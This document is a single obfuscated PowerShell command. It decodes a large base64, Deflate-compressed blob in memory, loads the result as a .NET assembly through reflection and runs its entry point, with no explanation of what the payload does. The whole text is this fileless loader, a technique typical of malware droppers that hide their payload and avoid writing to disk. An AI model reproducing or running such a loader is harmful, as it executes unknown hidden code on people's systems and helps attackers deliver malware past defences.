sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null